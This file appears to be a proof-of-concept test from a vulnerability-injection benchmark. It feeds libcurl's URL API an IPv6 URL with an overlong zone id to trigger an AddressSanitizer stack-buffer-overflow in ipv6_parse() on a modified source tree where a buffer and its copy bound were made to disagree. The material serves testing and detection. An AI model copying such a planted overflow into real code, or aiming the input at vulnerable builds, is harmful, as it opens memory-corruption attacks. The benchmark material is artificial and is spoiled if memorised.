/* AddressSanitizer proof-of-concept for a delocalized stack-buffer-overflow in
 * libcurl's URL parser (lib/urlapi.c, ipv6_parse()).
 *
 * The IPv6 zone identifier of a bracketed host is copied into a fixed stack
 * buffer. On the resulting tree the destination buffer and the copy bound no
 * longer agree (see selection.json "coupling"), so a long zone id overruns the
 * stack buffer. This probe drives only the public URL API with a well-formed,
 * in-contract URL string.
 *
 * Clean (no abort) on the original batch; ASan abort on the resulting tree.
 */
#include <curl/curl.h>

int main(void)
{
  CURLU *u;
  CURLUcode rc;

  /* A bracketed IPv6 literal with a long zone id after '%'. The two chars
     right after '%' ("zz") are not valid percent-escape hex, so URL decoding
     keeps the '%' literal and the zone id reaches ipv6_parse() intact. Every
     zone character is a valid host character and none is ']'. */
  static const char *url =
    "http://[::1%zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz]/";

  curl_global_init(CURL_GLOBAL_DEFAULT);

  u = curl_url();
  if(!u)
    return 1;

  /* Public API, in-contract input: parse a full URL string. */
  rc = curl_url_set(u, CURLUPART_URL, url, 0);

  curl_url_cleanup(u);
  curl_global_cleanup();

  (void)rc;
  return 0;
}
